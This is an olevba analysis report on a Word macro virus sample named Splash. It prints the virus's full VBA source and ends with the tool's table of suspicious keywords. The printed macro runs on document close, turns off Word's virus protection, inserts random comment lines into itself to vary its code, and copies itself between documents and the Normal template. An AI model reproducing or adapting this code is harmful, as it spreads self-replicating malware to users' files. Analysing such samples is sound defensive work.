olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Splash
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Splash - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Splash.bas 
in file: Virus.MSWord.Splash - OLE stream: 'Macros/VBA/Splash'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Attribute AutoClose.VB_Description = "..."
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Normal.Splash.AutoClose"
On Error Resume Next

    Application.ScreenUpdating = False

    WordBasic.DisableAutoMacros = 0
    Options.VirusProtection = False

    Set Current = MacroContainer

    For Grow = 1 To 20
        Number = Current.VBProject.VBComponents("Splash").CodeModule.ProcCountLines("AutoClose", vbext_pk_Proc)
        RandomLine = Int(Rnd() * Number + 1)
        RemarkLength = Int(Rnd() * 40 + 1)

            For Length = 1 To RemarkLength
                Remark = Remark + Chr$(Int((90 - 65 + 1) * Rnd + 65))
            Next Length

        Current.VBProject.VBComponents("Splash").CodeModule.InsertLines RandomLine, vbTab & "Rem " & Remark
        Remark = ""

    Next Grow

    Installed = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "Splash" Then
            Installed = True
        End If
    Next

    If Installed = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Splash", Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.Name, FileFormat:=wdFormatTemplate
    End If

    Installed = False

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "Splash" Then
            Installed = True
        End If
    Next

    If Installed = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Splash", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

